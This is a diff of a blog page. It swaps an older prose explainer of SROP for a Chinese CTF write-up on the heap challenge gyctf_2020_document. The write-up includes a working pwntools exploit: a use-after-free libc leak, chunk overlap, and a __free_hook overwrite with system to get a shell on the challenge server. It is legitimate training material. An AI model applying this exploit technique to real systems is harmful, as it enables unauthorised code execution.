@@ -15,17 +15,20 @@
 
 
 
-<meta name="description" content="今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。">
+<meta name="description" content="今天来康康这道题gyctf_2020_document 静态分析确定漏洞类型经典的堆菜单题，保护全开，2.23的libc。保护全开意味着got表劫持不了。增删改查四样动作都有，并且没有那种虚晃一枪(例如show函数直接给你puts一个too young too simple之类的)的函数。 先看add函数，malloc了两个堆块，都是固定大小，一个堆块是0x20大小，另一个是0x90大小。然后第二">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SROP">
-<meta property="og:url" content="http://example.com/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:title" content="gyctf_2020_document write up">
+<meta property="og:url" content="http://example.com/2021/10/26/gyctf_2020_document/index.html">
 <meta property="og:site_name" content="xia0ji233&#39;s blog">
-<meta property="og:description" content="今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。">
+<meta property="og:description" content="今天来康康这道题gyctf_2020_document 静态分析确定漏洞类型经典的堆菜单题，保护全开，2.23的libc。保护全开意味着got表劫持不了。增删改查四样动作都有，并且没有那种虚晃一枪(例如show函数直接给你puts一个too young too simple之类的)的函数。 先看add函数，malloc了两个堆块，都是固定大小，一个堆块是0x20大小，另一个是0x90大小。然后第二">
 <meta property="og:locale">
-<meta property="article:published_time" content="2021-06-29T02:00:00.000Z">
-<meta property="article:modified_time" content="2021-10-25T05:22:41.193Z">
+<meta property="og:image" content="http://example.com/2021/10/26/gyctf_2020_document/1.png">
+<meta property="og:image" content="http://example.com/2021/10/26/gyctf_2020_document/2.png">
+<meta property="article:published_time" content="2021-10-26T02:00:00.000Z">
+<meta property="article:modified_time" content="2021-10-26T06:41:00.620Z">
 <meta property="article:author" content="xia0ji233">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/26/gyctf_2020_document/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>SROP | xia0ji233&#39;s blog</title>
+<title>gyctf_2020_document write up | xia0ji233&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -197,11 +200,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-SROP学习报告" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-gyctf_2020_document" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/" class="article-date">
-      <time datetime="2021-06-29T02:00:00.000Z" itemprop="datePublished">2021-06-29</time>
+      <a href="/2021/10/26/gyctf_2020_document/" class="article-date">
+      <time datetime="2021-10-26T02:00:00.000Z" itemprop="datePublished">2021-10-26</time>
 </a>
 
 
@@ -216,7 +219,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      SROP
+      gyctf_2020_document write up
     </h1>
   
 
@@ -237,12 +240,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。</p>
-<span id="more"></span>
+        <p>今天来康康这道题<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_document">gyctf_2020_document</a></p>
+<h2 id="静态分析确定漏洞类型"><a href="#静态分析确定漏洞类型" class="headerlink" title="静态分析确定漏洞类型"></a>静态分析确定漏洞类型</h2><p>经典的堆菜单题，保护全开，2.23的libc。保护全开意味着got表劫持不了。增删改查四样动作都有，并且没有那种虚晃一枪(例如show函数直接给你puts一个too young too simple之类的)的函数。</p>
+<p>先看add函数，malloc了两个堆块，都是固定大小，一个堆块是0x20大小，另一个是0x90大小。然后第二个堆块的指针存在了第一个堆块上面。第一个堆块后八个字节用来存了性别，性别要么1要么16，是通过判断你输入的是否为W来决定的。之后就是那个0x90的大堆块上面存一个名字，中间间隔一个flag，然后堆块偏移0x10的位置上面放上你要输入的内容。</p>
+<p>看看delete函数，存在明显 的UAF漏洞，可以操作free的堆块。并且只free 0x90的堆块而0x20的堆块不会free。那么通过这些分析我们就可以先add两个堆块，free掉第一个之后show第一个就能泄露出libc的地址。</p>
+<p>其它的中规中矩，唯独edit函数正常情况下它每个堆块只允许edit一次，但也只是因为那个0x20堆块的后面的那个flag原因。</p>
+<h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>这里建议，name强制8位就不要想这么多直接给<code>/bin/sh;</code>就完了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="string">b&#x27;/bin/sh;&#x27;</span>,<span class="string">b&#x27;W&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x70</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
-<p>SROP主要攻击方式就是针对linux系统调用的一个弱点进行攻击的，在进行系统调用的时候，内核会发出signal挂起我们正在运行的程序，并且保存上下文（上下文即所有寄存器的值），然后这个上下文还是以一个结构体的形式存在于栈里面的。此时从用户态切换到内核态，说明现在在执行系统调用，执行完成系统调用的时候会进行系统调用的返回，这个返回又要调用15号的系统调用，恢复上下文并且切换到用户态。这样子系统调用的方法有一个弱点就是，如果我控制了栈，在它挂起的时候我偷偷修改rip=syscall,rax=59(execeve的系统调用号),rdi=”/bin/sh”,rsi=0,rdx=0。那么在结束系统调用的时候就会执行execeve(“/bin/sh”)打开一个shell。</p>
-<p>在就是说在结束系统调用的时候会进行这么一个系统调用，那么如果我本身没有系统调用而调用了这个系统调用会怎么样呢？答案是还会把栈顶的上下文给返回，当然没有精心构造过栈而直接调用肯定是会出错的。攻击的时候我就让它准备好dl_sigreturn的系统调用，然后在预期的栈顶构造一个只执行execeve(“/bin/sh”)的上下文，那么就可以直接完成打开shell的攻击。</p>
-<p>以上都是我根据srop以及一些师傅的资料自己理解的，如有错误那挺正常的，也请师傅们能指出我的错误，感激不尽。</p>
+<p>得到libc地址</p>
+<p><img src="/2021/10/26/gyctf_2020_document/1.png" alt="1"></p>
+<h2 id="确定攻击思路"><a href="#确定攻击思路" class="headerlink" title="确定攻击思路"></a>确定攻击思路</h2><p>构造堆重叠以此能修改0x20堆块上面的指针到<code>free_hook</code>去覆盖<code>free_hook</code>为system函数，再free一个带有/bin/sh的堆块就可以getshell，此时bin中已经有一个0x90的<code>unsorted bin</code>，再次add一个因为先分配了这个0x20的堆块，<code>unsorted bin</code>就会进行切割，但是edit 0发现它在0x10偏移上edit的，因此不行。不行咱就再换一个嘛，再add一次，此时的<code>unsorted bin</code>会进入smallbin，但是不影响，还是从上面切割下来作为第四组的小块。然后edit第0个块把这个块的指针改成<code>free_hook</code>。此时第四个堆块的指针被改成了<code>free_hook</code>，那么此时再edit 3为system即可。实际测试需要考虑它在读数据之后会写在那个指针偏移0x10的地方写数据，所以前面我们edit的时候也把它改成<code>free_hook</code>-0x10。最后edit 3 为system函数。由于这个输入是for() read(0,buf,1)读取的，因此0x70个字节必须写满，那边由于都是hook，我们都清空较为保险，因为万一不小心调用到了那边的hook很容易crash，那么exp根据以上思路很容易得到了。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">def conn(x,file_name):</span><br><span class="line">    if x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-64.so&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        p=remote(&#x27;node4.buuoj.cn&#x27;,26476)</span><br><span class="line">        libc=ELF(&#x27;./libc/libc-2.23-buu64.so&#x27;)</span><br><span class="line">    return ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line">def add(name,sex,payload):#8,1,0x70</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;1&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;name&#x27;,name)</span><br><span class="line">    p.sendafter(b&#x27;sex&#x27;,sex,timeout=0.01)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line">def edit(index,sex,payload):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line">    if sex:p.sendlineafter(b&#x27;?&#x27;,b&#x27;Y&#x27;)</span><br><span class="line">    else:p.sendlineafter(b&#x27;?&#x27;,&#x27;N&#x27;)</span><br><span class="line">    p.sendafter(b&#x27;information&#x27;,payload)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index :&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.sendlineafter(b&#x27;choice :&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;index&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(0,&#x27;./gyctf_2020_document&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;a&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;b&#x27;*0x70)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\0&#x27;))-88-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">success(&#x27;libc:&#x27;+hex(libc_addr))</span><br><span class="line">success(&#x27;free_hook&#x27;+hex(libc_addr+libc.sym[&#x27;__free_hook&#x27;]))</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;c&#x27;*0x70)</span><br><span class="line">add(b&#x27;/bin/sh;&#x27;,b&#x27;W&#x27;,b&#x27;d&#x27;*0x70)</span><br><span class="line">edit(0,0,b&#x27;d&#x27;*0x10+p64(libc_addr+libc.sym[&#x27;__free_hook&#x27;]-0x10)+b&#x27;d&#x27;*0x58)</span><br><span class="line">edit(3,0,p64(libc_addr+libc.sym[&#x27;system&#x27;])+b&#x27;e&#x27;*0x68)</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/26/gyctf_2020_document/2.png" alt="2"></p>
 
       
     </div>
@@ -251,13 +262,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/">SROP</a></p>
+        <p><span>本文标题:</span><a href="/2021/10/26/gyctf_2020_document/">gyctf_2020_document write up</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
-        <p><span>发布时间:</span>2021-06-29, 10:00:00</p>
-        <p><span>最后更新:</span>2021-10-25, 13:22:41</p>
+        <p><span>发布时间:</span>2021-10-26, 10:00:00</p>
+        <p><span>最后更新:</span>2021-10-26, 14:41:00</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/" title="SROP">http://example.com/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/10/26/gyctf_2020_document/" title="gyctf_2020_document write up">http://example.com/2021/10/26/gyctf_2020_document/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/10/26/gyctf_2020_document/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -269,16 +280,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/">
-                    浙江2020省赛pwn1
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
-                    2021华东南赛区国赛线下赛
+                <a href="/2021/10/25/zjctf2021%E9%A2%84%E8%B5%9B/">
+                    2021浙江省预赛
                 </a>
             </div>
         
@@ -290,7 +295,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.</span> <span class="toc-text">静态分析确定漏洞类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">泄露libc地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">确定攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -326,7 +331,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"SROP　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"gyctf_2020_document write up　| xia0ji233's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -346,15 +351,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2021/07/15/%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9Bpwn1%20writeup/" title="上一篇: 浙江2020省赛pwn1">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/" title="下一篇: 2021华东南赛区国赛线下赛">
+            <a href="/2021/10/25/zjctf2021%E9%A2%84%E8%B5%9B/" title="下一篇: 2021浙江省预赛">
                 <i class="fa fa-angle-right"></i>
             </a>
         
